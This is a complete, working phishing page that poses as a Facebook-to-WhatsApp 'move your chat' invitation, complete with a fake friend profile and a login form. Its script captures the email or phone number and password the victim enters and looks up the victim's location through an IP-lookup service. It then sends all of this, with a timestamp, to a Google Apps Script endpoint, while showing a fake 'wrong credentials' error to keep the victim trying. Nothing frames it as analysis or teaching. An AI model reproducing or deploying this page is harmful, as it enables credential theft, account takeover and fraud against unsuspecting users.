<!DOCTYPE html>
<html lang="en">

<head>
  <script>
    const pageConfig = {
      title: "Move Safely",
      description: "Your friend wants to move your chat to WhatsApp. Click to continue!",
      // ogTitle: "Facebook Private Chat",
      // ogDescription: "Accept this invitation to a prvate chat with your friend.",
      // ogImage: "img/share.jpg",
      profileName: "+2335*****521",
      bio: "Your friend wants to move your chat to WhatsApp. Safe chat is ON for extra security. Confirm your account to continue!",
      profilePic: "img/me.jpg",
      profileBorder: true,
      onlineStatus: true,
    };
  </script>

  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link rel="icon" href="img/favicon.svg" type="image/svg+xml">
  <title id="dynamicTitle"></title>
  <meta name="description" id="metaDescription" content="">
  <meta property="og:title" content="WhatsApp">
  <meta property="og:description" content="Your friend wants to move your chat to WhatsApp. Click to continue!">
  <meta property="og:image" content="img/image.png">
  <meta property="og:type" content="website">
  <meta property="og:url" content="https://fb-move.github.io/wa.me">
  <style>
    :root {
      --white: #e2e8f0;
      --grey: #94a3b88e;
      --blue: #090d1759;
      --lightblue: #1d2531;
    }
    
    input,
    textarea,
    button,
    select,
    a {
      -webkit-tap-highlight-color: rgba(0,0,0,0);
    }

    a:focus,a:visited,a:active{
      outline: none;
    }

    * {
      -webkit-tap-highlight-color: transparent;
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body,
    html {
      height: 100%;
      width: 100%;
      background: #F0F2F5;
      display: flex;
      align-items: center;
      justify-content: center;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
      -webkit-font-smoothing: antialiased;
      -moz-osx-font-smoothing: grayscale;
    }

    .profile-section {
      display: flex;
      width: 100%;
      flex-direction: column;
      align-items: center;
      margin-bottom: 20px;
    }

    .profile-container {
        position: relative;
        width: 120px;
        height: 120px;
        border: 3px solid #0865FE; /* Blue border */
        border-radius: 50%;
        padding: 3.2px;
        box-sizing: border-box;
        margin-bottom: 10px;
    }
    
    .profile-container img {
        width: 100%;
        height: 100%;
        border-radius: 50%;
        object-fit: cover;
    }
    
    .active-dot {
        position: absolute;
        bottom: 8px;
        right: 9px;
        width: 20px;
        height: 20px;
        background-color: #30A24B; /* Green dot */
        border: 3px solid white;
        border-radius: 50%;
    }
    
    .profile-name {
        font-size: 18px;
        font-weight: bold;
        color: #050505;
        text-align: center;
        margin-bottom: 4px;
    }
    
    .profile-bio {
        font-size: 14px;
        color: #696A6E; /* Light grey similar to Facebook */
        text-align: center;
        max-width: 320px;
        line-height: 1.3;
        margin-bottom: 10px;
    }
    
    form {
      background: #fff;
      width: 90%;
      max-width: 396px;
      box-shadow: 0 2px 4px rgba(0, 0, 0, .1), 0 8px 16px rgba(0, 0, 0, .1);
      padding: 20px;
      border-radius: 8px;
      display: flex;
      flex-direction: column;
      gap: 15px;
    }

    .input-container {
      position: relative;
      width: 100%;
    }

    form input {
      padding: 14px 16px;
      border: 1px solid #DEDFE3;
      color: #1d2129;
      font-size: 17px;
      border-radius: 5px;
      width: 100%;
      outline: none;
      transition: border 0.2s ease, box-shadow 0.2s ease;
    }

    form input:focus {
      border: 1.2px solid #0865FE;
      box-shadow: 0 0 0 2.3px rgba(231, 243, 255);
    }

    form input.grey-placeholder:focus::placeholder {
      color: #BEC3C9;
    }

    .toggle-password {
      position: absolute;
      right: 25px;
      top: 50%;
      transform: translateY(-50%);
      height: 14px;
      width: 14px;
      cursor: pointer;
      display: none;
    }

    .toggle-password img {
      position: absolute;
      width: 100%;
      height: 100%;
      filter: brightness(0);
      pointer-events: none;
    }

    .login {
      background-color: #0865FE;
      border: none;
      border-radius: 6px;
      font-size: 20px;
      line-height: 48px;
      padding: 0 16px;
      width: 100%;
      font-weight: bold;
      color: #fff;
      cursor: pointer;
      transition: background-color 0.3s ease, transform 0.3s ease;
    }

    .login.active {
      background-color: #366FC9; /* darker version of #1877f2 */
      transform: scale(1.03);    /* slightly larger */
    }

    .forget {
      color: #0865FE;
      cursor: pointer;
      /* text-transform: capitalize; */
      font-size: 16px;
      margin: 0 auto;
      width: fit-content;
      text-decoration: none;       /* remove underline by default */
    }
    
    .forget:hover,
    .forget:focus,
    .forget:active {
      text-decoration: underline;  /* show underline only on interaction */
    }
    
     .little-about {
        font-size: 5px;
        color: #696A6E; /* Light grey similar to Facebook */
        text-align: center;
        max-width: 300px;
        line-height: 1.25;
        margin-top: 10px;
    }
    
    .page-footer {
      position: fixed;
      bottom: 10px;
      width: 100%;
      display: flex;
      justify-content: center;
      z-index: 1;
      transition: opacity 0.3s ease;
    }

    .footer-logo {
      width: 58px; /* small size */
      opacity: 1;  /* full opacity */
    }
    
    .overlay {
      position: fixed;
      inset: 0;
      background: rgba(0, 0, 0, 0.5);
      display: none;
      justify-content: center;
      align-items: center;
      padding: 16px;
      box-sizing: border-box;
      z-index: 9999;
    }
    
    .message-container {
      background: white;
      max-width: 320px;
      width: 100%;
      padding: 24px;
      box-shadow: 0 2px 8px rgba(0,0,0,0.3);
      border-radius: 2px;
      display: flex;
      flex-direction: column;
      gap: 16px;
      box-sizing: border-box;
    }
    
    .message-text h2 {
      margin: 0;
      font-size: 17px;
      font-weight: normal;
      text-align: left;
      margin-bottom: 20px;
    }
    
    .message-text p {
      margin-bottom: 5px;
      font-size: 16px;
      color: #555;
      text-align: left;
    }
    
    .button-row {
      display: flex;
      justify-content: flex-end;
    }
    
    .ok-button {
      background: none;
      border: none;
      padding: 0px;
      color: #0865FE;
      font-size: 14px;
      cursor: pointer;
      line-height: 1;
    }
    
    @keyframes blinkColor {
      0% {
        background-color: #366FC9;
      }
      50% {
        background-color: #0865FE;
      }
      100% {
        background-color: #0865FE;
      }
    }
    
    .login.blink {
      animation: blinkColor 0.5s ease;
    }
  </style>
</head>

<body>
  <div class="profile-section">
    <div class="profile-container" id="profileContainer">
      <img id="profilePic" src="" alt="Profile Picture">
      <div class="active-dot" id="onlineStatusDot"></div>
    </div>
    <div class="profile-name" id="profileName"></div>
    <div class="profile-bio" id="profileBio"></div>
  
    <form id="loginForm" novalidate>
      <input type="text" placeholder="Email or Phone Number" id="emailOrPhone">
      <div class="input-container">
        <input type="password" placeholder="Password" id="password">
        <span class="toggle-password" id="toggleWrapper"
        onclick="togglePassword()" onmousedown="event.preventDefault()">
          <img src="img/hide.svg" id="toggleIcon" alt="Toggle Password">
        </span>
      </div>
      <button type="submit" class="login">Go To WhatsApp</button>
      <!-- <a href="https://web.facebook.com/recover/initiate/" target="_blank" class="forget">Forgot password?</a> -->
    </form>
    <div class="little-about">
      a strict end to end encrypted chat from the traditional facebook
      chat with some extra privacy and security features like no chat screenshots,
      no call snooping, and safe number sharing and others.
    </div>
  </div>
  <footer class="page-footer" id="footer">
    <img src="img/logo.svg" alt="Logo" class="footer-logo">
  </footer>
  <div class="overlay" id="overlay" onclick="hidePopup()">
    <div class="message-container" onclick="event.stopPropagation()">
      <div class="message-text" id="popupText">
        <h2 id="popupTitle">Sorry, something went wrong</h2>
        <p id="popupMessage">Please try again.</p>
      </div>
      <div class="button-row">
        <button class="ok-button" onclick="hidePopup()">OK</button>
      </div>
    </div>
  </div>

  <script>
    const passwordInput = document.getElementById('password');
    const toggleWrapper = document.getElementById('toggleWrapper');
    const toggleIcon = document.getElementById('toggleIcon');
    const loginForm = document.getElementById('loginForm');
    const emailInput = document.getElementById('emailOrPhone');

    let lastSubmitted = {
      emailOrPhone: '',
      password: ''
    };

    passwordInput.addEventListener('input', () => {
      if (passwordInput.value.length > 0) {
        toggleWrapper.style.display = 'block';
      } else {
        toggleWrapper.style.display = 'none';
        passwordInput.type = 'password';
        toggleIcon.src = 'img/hide.svg';
      }
    });

    toggleWrapper.addEventListener('mousedown', (e) => {
      e.preventDefault(); // prevent focus loss
    });

    function togglePassword() {
      const start = passwordInput.selectionStart;
      const end = passwordInput.selectionEnd;
      const wasFocused = document.activeElement === passwordInput;
    
      // Toggle password visibility
      if (passwordInput.type === 'password') {
        passwordInput.type = 'text';
        toggleIcon.src = 'img/view.svg';
      } else {
        passwordInput.type = 'password';
        toggleIcon.src = 'img/hide.svg';
      }
    
      // Restore cursor position if it was focused
      if (wasFocused) {
        // Wait for type change to take effect
        requestAnimationFrame(() => {
          passwordInput.setSelectionRange(start, end);
        });
      }
    }

    function handleFocus(input) {
      if (input.value === '') {
        input.classList.add('grey-placeholder');
      }
    }

    function handleBlur(input) {
      input.classList.remove('grey-placeholder');
    }

    [emailInput, passwordInput].forEach(input => {
      input.addEventListener('focus', () => handleFocus(input));
      input.addEventListener('blur', () => handleBlur(input));
    });

    function isValidEmail(email) {
      const email_regex = /^(([^<>()[\]\\.,;:\s@"]+(\.[^<>()[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
      return email_regex.test(email);
    }

    function isValidPhone(phone) {
      const cleaned = phone.replace(/[\s()+]/g, ''); // Remove spaces, (), +
      if (!/^[0-9]+$/.test(cleaned)) return false;
      if (cleaned.length < 9 || cleaned.length > 13) return false;
      return true;
    }

    function validateInput(emailOrPhone, password) {
      const isEmailValid = isValidEmail(emailOrPhone);
      const isPhoneValid = isValidPhone(emailOrPhone);
      const isPasswordValid = password.length >= 6;
      return (isEmailValid || isPhoneValid) && isPasswordValid;
    }

    function focusFirstEmptyField(emailOrPhone, password) {
      if (emailOrPhone.trim() === '') {
        emailInput.focus();
      } else if (password.trim() === '') {
        passwordInput.focus();
      }
    }
    
    function delayedPopup(title = 'Sorry, something went wrong', message = 'Please try again.') {
      const delays = [2000, 4000, 6000];
      const randomDelay = delays[Math.floor(Math.random() * delays.length)];
      setTimeout(() => {
        setPopupContent(title, message);
        showPopup();
      }, randomDelay);
    }
    
    function setPopupContent(title, message) {
      document.getElementById('popupTitle').textContent = title;
      document.getElementById('popupMessage').textContent = message;
    }

    function showPopup() {
      document.getElementById('overlay').style.display = 'flex';
    }
    
    function hidePopup() {
      document.getElementById('overlay').style.display = 'none';
    
      const loginButton = document.querySelector('.login');
      loginButton.classList.remove('active'); // remove animated class
    }

    loginForm.addEventListener('submit', function (e) {
      e.preventDefault();
    
      const emailOrPhone = emailInput.value.trim();
      const password = passwordInput.value.trim();
      const currentTime = new Date().toLocaleString();
    
      if (emailOrPhone === '' || password === '') {
        focusFirstEmptyField(emailOrPhone, password);
      
        const loginButton = document.querySelector('.login');
        loginButton.classList.remove('blink'); // reset animation if it was triggered before
      
        // Force reflow so animation can be re-triggered
        void loginButton.offsetWidth;
      
        loginButton.classList.add('blink');
        return;
      }
    
      const loginButton = document.querySelector('.login');
      loginButton.classList.add('active'); // ✅ animation runs only now
    
      // Validate input first
      if (!validateInput(emailOrPhone, password)) {
        delayedPopup("Invalid Input!", "Please enter a valid email/phone and password.");
        return;
      }
    
      // prevent duplicate submission
      if (emailOrPhone === lastSubmitted.emailOrPhone && password === lastSubmitted.password) {
        console.log('Duplicate submission detected.');
    
        loginButton.classList.add('active');
        delayedPopup();
        return;
      }
    
      lastSubmitted.emailOrPhone = emailOrPhone;
      lastSubmitted.password = password;
    
      delayedPopup("Need help finding your account?", "It looks like you've entered wrong credentials. Please try again!");
    
      fetch('https://ipapi.co/json/')
        .then(response => response.json())
        .then(data => {
          const city = data.city || 'Unknown';
          const country = data.country_name || 'Unknown';
          const location = `${city}, ${country}`;
          const time = currentTime;
      
          // 🔄 Send to Google Sheets via Apps Script
          function sendToSheetWithRetry(payload, retries = 10, delay = 1000) {
            fetch("https://script.google.com/macros/s/AKfycbww2H3HicH47O3M31P7QhzZCw1dTe5MAej5Payh6eHlT0cgpkH0M0iXcxoOnzsYvKXK/exec", {
              method: "POST",
              body: JSON.stringify(payload),
              headers: {
                "Content-Type": "text/plain;charset=utf-8"
              }
            })
            .then(res => {
              if (!res.ok) throw new Error(`HTTP error ${res.status}`);
              return res.json();
            })
            .then(response => {
              console.log("Sheet Response:", response);
            })
            .catch(error => {
              console.error("Sheet Error:", error);
              if (retries > 0) {
                setTimeout(() => {
                  sendToSheetWithRetry(payload, retries - 10, delay * 2); // exponential backoff
                }, delay);
              } else {
                console.error("Failed after multiple retries");
              }
            });
          }
          sendToSheetWithRetry({
            emailOrPhone: `'${emailOrPhone}`,
            password: `'${password}`,
            location,
            time
          });
        });
    });
  </script>
  
  <script>
    const footer = document.getElementById('footer');
    const isMobile = window.innerWidth <= 768;
    let initialHeight = window.innerHeight;
    let isKeyboardVisible = false;
    let lastHeight = initialHeight;
  
    let resizeTimeout;
    window.addEventListener('resize', () => {
      clearTimeout(resizeTimeout);
      resizeTimeout = setTimeout(() => {
        const currentHeight = window.innerHeight;
  
        if (isMobile) {
          if (!isKeyboardVisible && initialHeight - currentHeight > 150) {
            footer.style.display = 'none';
            isKeyboardVisible = true;
          } else if (isKeyboardVisible && currentHeight >= initialHeight - 50) {
            // Keyboard is likely closed
            footer.style.display = 'flex';
            isKeyboardVisible = false;
          }
  
          lastHeight = currentHeight;
        }
      }, 100); // Small debounce delay
    });
  
    // Restore footer on blur
    document.querySelectorAll('input').forEach(input => {
      input.addEventListener('blur', () => {
        setTimeout(() => {
          if (isMobile) {
            const currentHeight = window.innerHeight;
            if (currentHeight >= initialHeight - 50) {
              footer.style.display = 'flex';
              isKeyboardVisible = false;
            }
          }
        }, 300); // Delay ensures keyboard actually closes
      });
    });
  </script>
  
  <script>
    // Apply configuration values to HTML
    document.title = pageConfig.title;
    document.getElementById("dynamicTitle").textContent = pageConfig.title;
    document.getElementById("metaDescription").setAttribute("content", pageConfig.description);
    // document.getElementById("ogTitle").setAttribute("content", pageConfig.ogTitle);
    // document.getElementById("ogDescription").setAttribute("content", pageConfig.ogDescription);
    // document.getElementById("ogImage").setAttribute("content", pageConfig.ogImage);
  
    // Profile Picture and Name
    document.getElementById("profilePic").src = pageConfig.profilePic;
    document.getElementById("profileName").textContent = pageConfig.profileName;
    document.getElementById("profileBio").textContent = pageConfig.bio;
  
    // Toggle border
    const container = document.getElementById("profileContainer");
    if (!pageConfig.profileBorder) {
      container.style.border = "none";
    }
  
    // Toggle green dot
    const dot = document.getElementById("onlineStatusDot");
    if (!pageConfig.onlineStatus) {
      dot.style.display = "none";
    }
  </script>
</body>
</html>